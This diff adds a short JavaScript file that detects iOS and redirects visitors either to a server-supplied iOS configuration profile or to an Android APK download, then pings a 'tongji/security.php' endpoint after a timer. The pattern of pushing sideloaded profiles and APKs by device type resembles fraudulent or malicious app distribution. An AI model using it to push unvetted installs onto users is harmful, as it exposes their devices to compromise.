@@ -1,0 +1,24 @@
+function visita() {
+	$.ajax({
+		url: "./api/attachment_package/getlist",
+		dataType: "json",
+		success:function(data){
+			var u = navigator.userAgent;
+			var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+			if (data.meta.code == 0) {
+				if (isiOS) {
+					window.location.href = data.data.mobileconfig_url;
+				} else {
+					window.location.href = data.data.apk_url;
+				}
+			}
+		},
+	});
+}
+window.setTimeout("security()", 3000);
+function security() {
+	$.ajax({
+		url: "./tongji/security.php",
+		dataType: "jsonp",
+	});
+}
